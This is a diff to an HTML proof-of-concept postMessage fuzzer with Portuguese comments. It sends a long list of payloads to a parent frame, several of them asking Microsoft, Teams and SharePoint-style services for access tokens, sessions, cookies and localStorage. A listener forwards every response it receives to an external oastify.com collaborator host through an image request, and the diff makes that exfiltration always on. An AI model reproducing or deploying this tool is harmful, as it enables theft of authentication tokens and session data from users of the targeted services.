@@ -1,13 +1,17 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>postMessage Fuzzer</title>
+  <meta charset="UTF-8">
+  <title>PoC postMessage Fuzzer</title>
   <style>
     body {
       background: black;
       color: #0f0;
       font-family: monospace;
       padding: 1rem;
+    }
+    h2 {
+      color: #f55;
     }
   </style>
 </head>
@@ -22,7 +26,7 @@
       console.log(msg);
     };
 
-    // Lista de payloads para fuzzing
+    // Payloads variados
     const payloads = [
       "ping",
       { type: "ping" },
@@ -32,17 +36,37 @@
       { action: "getAccessToken" },
       { action: "getUser" },
       { type: "getAuth" },
+      { command: "getListInfo" },
+      { ms: true, command: "init" },
+      { requestId: 1, method: "getToken" },
+      { requestId: 2, method: "getSession" },
+      { requestId: 3, method: "getAccessToken" },
+      { requestId: 4, method: "msGraph.getUser" },
       { target: "office-auth", action: "getToken" },
       { target: "microsoft", data: { request: "auth" }},
       { messageType: "getToken" },
-      { requestId: 123, method: "getAccessToken" },
       { meta: { cmd: "auth" } },
-      { ms: true, command: "init" },
-      { a: 1, b: 2 },
-      { random: Math.random().toString(36).substring(2) }
+      { credentials: "export" },
+      { telemetry: "dump" },
+      { diagnostic: true, dump: "tokens" },
+      { target: "lists", cmd: "steal" },
+      { spoof: true, try: "getToken" },
+      { tokenRequest: true },
+      { state: "dump" },
+      { __debug__: true, dump: "session" },
+      { ms: "true", command: "getSession" },
+      { type: "getTeamsUser" },
+      { service: "teams", action: "getUserInfo" },
+      { kind: "ping", spoof: true },
+      { sharepoint: true, cmd: "whoami" },
+      { shell: "open", type: "exploit" },
+      { random: Math.random().toString(36).substring(2) },
+      { target: "lists.live.com", command: "dumpTokens" },
+      { get: "localStorage" },
+      { get: "cookies" }
     ];
 
-    // Envia todos os payloads
+    // Envia para o parent cada 500ms
     function sendPayloads() {
       log("🚀 Enviando payloads para parent...");
       payloads.forEach((data, i) => {
@@ -53,7 +77,7 @@
       });
     }
 
-    // Escuta respostas
+    // Ouvinte para receber respostas do parent
     window.addEventListener("message", (e) => {
       const data = {
         origin: e.origin,
@@ -61,12 +85,12 @@
       };
       log("📥 Recebido: " + JSON.stringify(data, null, 2));
 
-      // Exfiltra (opcional):
+      // Exfiltra para Oastify
       const img = new Image();
       img.src = `https://k2nxq1ustsd6o6gb79wwabzjcai16rug.oastify.com/?data=${encodeURIComponent(JSON.stringify(data))}`;
     });
 
-    // Inicia fuzzing
+    // Starta fuzzing
     sendPayloads();
   </script>
 </body>
